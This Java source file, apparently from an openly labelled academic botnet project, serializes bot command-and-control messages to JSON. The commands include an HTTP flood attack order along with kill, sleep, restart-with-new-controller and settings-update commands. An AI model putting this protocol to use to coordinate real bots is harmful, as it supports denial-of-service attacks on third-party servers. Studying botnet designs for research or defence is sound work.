/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.control.command.serial;

import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
import com.acmutv.botnet.core.control.Controller;
import com.acmutv.botnet.core.control.command.BotCommand;
import com.acmutv.botnet.tool.time.Interval;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;

import java.io.IOException;
import java.util.List;
import java.util.Map;

/**
 * The JSON serializer for {@link BotCommand}.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see BotCommand
 */
public class BotCommandSerializer extends StdSerializer<BotCommand> {

  /**
   * The singleton of {@link BotCommandSerializer}.
   */
  private static BotCommandSerializer instance;

  /**
   * Returns the singleton of {@link BotCommandSerializer}.
   * @return the singleton.
   */
  public static BotCommandSerializer getInstance() {
    if (instance == null) {
      instance = new BotCommandSerializer();
    }
    return instance;
  }

  /**
   * Initializes the singleton of {@link BotCommandSerializer}.
   */
  private BotCommandSerializer() {
    super((Class<BotCommand>) null);
  }

  @Override
  public void serialize(BotCommand value, JsonGenerator gen, SerializerProvider provider) throws IOException {
    gen.writeStartObject();
    gen.writeStringField("command", value.getScope().getName());
    if (value.getScope().isWithParams()) {
      switch (value.getScope()) {
        case ATTACK_HTTPFLOOD:
          @SuppressWarnings("unchecked") final List<HttpFloodAttack> attacks = (List<HttpFloodAttack>) value.getParams().get("attacks");
          final Interval attackDelay = (Interval) value.getParams().get("delay");
          final Boolean attackReport = (Boolean) value.getParams().get("report");

          gen.writeArrayFieldStart("attacks");
          for (HttpFloodAttack attack : attacks) {
            provider.findValueSerializer(HttpFloodAttack.class).serialize(attack, gen, provider);
          }
          gen.writeEndArray();

          if (attackDelay != null) {
            gen.writeStringField("delay", attackDelay.toString());
          }

          if (attackReport != null) {
            gen.writeBooleanField("report", attackReport);
          }

          break;

        case CALMDOWN:
          final Boolean calmdownWait = (Boolean) value.getParams().get("wait");
          final Interval calmdownDelay = (Interval) value.getParams().get("delay");
          final Boolean calmdownReport = (Boolean) value.getParams().get("report");

          if (calmdownWait != null) {
            gen.writeBooleanField("wait", calmdownWait);
          }

          if (calmdownDelay != null) {
            gen.writeStringField("delay", calmdownDelay.toString());
          }

          if (calmdownReport != null) {
            gen.writeBooleanField("report", calmdownReport);
          }

          break;

        case KILL:
          final Boolean killWait = (Boolean) value.getParams().get("wait");
          final Interval killDelay = (Interval) value.getParams().get("delay");
          final Boolean killReport = (Boolean) value.getParams().get("report");

          if (killWait != null) {
            gen.writeBooleanField("wait", killWait);
          }

          if (killDelay != null) {
            gen.writeStringField("delay", killDelay.toString());
          }

          if (killReport != null) {
            gen.writeBooleanField("report", killReport);
          }

          break;

        case REPORT:
          final Interval reportDelay = (Interval) value.getParams().get("delay");

          if (reportDelay != null) {
            gen.writeStringField("delay", reportDelay.toString());
          }

          break;

        case RESTART:
          final Controller controller = (Controller) value.getParams().get("controller");
          final Boolean restartWait = (Boolean) value.getParams().get("wait");
          final Interval restartDelay = (Interval) value.getParams().get("delay");
          final Boolean restartReport = (Boolean) value.getParams().get("report");

          gen.writeFieldName("controller");
          provider.findValueSerializer(Controller.class).serialize(controller, gen, provider);

          if (restartWait != null) {
            gen.writeBooleanField("wait", restartWait);
          }

          if (restartDelay != null) {
            gen.writeStringField("delay", restartDelay.toString());
          }

          if (restartReport != null) {
            gen.writeBooleanField("report", restartReport);
          }

          break;

        case SLEEP:
          final Interval sleepTimeout = (Interval) value.getParams().get("timeout");
          final Interval sleepDelay = (Interval) value.getParams().get("delay");
          final Boolean sleepReport = (Boolean) value.getParams().get("report");

          if (sleepTimeout != null) {
            gen.writeStringField("timeout", sleepTimeout.toString());
          }

          if (sleepDelay != null) {
            gen.writeStringField("delay", sleepDelay.toString());
          }

          if (sleepReport != null) {
            gen.writeBooleanField("report", sleepReport);
          }

          break;

        case UPDATE:
          final Interval updateDelay = (Interval) value.getParams().get("delay");
          @SuppressWarnings("unchecked") final Map<String,String> settings = (Map<String,String>) value.getParams().get("settings");
          final Boolean updateReport = (Boolean) value.getParams().get("report");

          if (settings != null) {
            gen.writeObjectFieldStart("settings");
            for (Map.Entry<String,String> entry : settings.entrySet()) {
              gen.writeStringField(entry.getKey(), entry.getValue());
            }
            gen.writeEndObject();
          }

          if (updateDelay != null) {
            gen.writeStringField("delay", updateDelay.toString());
          }

          if (updateReport != null) {
            gen.writeBooleanField("report", updateReport);
          }

          break;

        case WAKEUP:
          final Interval wakeupDelay = (Interval) value.getParams().get("delay");
          final Boolean wakeupReport = (Boolean) value.getParams().get("report");

          if (wakeupDelay != null) {
            gen.writeStringField("delay", wakeupDelay.toString());
          }

          if (wakeupReport != null) {
            gen.writeBooleanField("report", wakeupReport);
          }

          break;

        default:
          break;
      }
    }
    gen.writeEndObject();
  }

}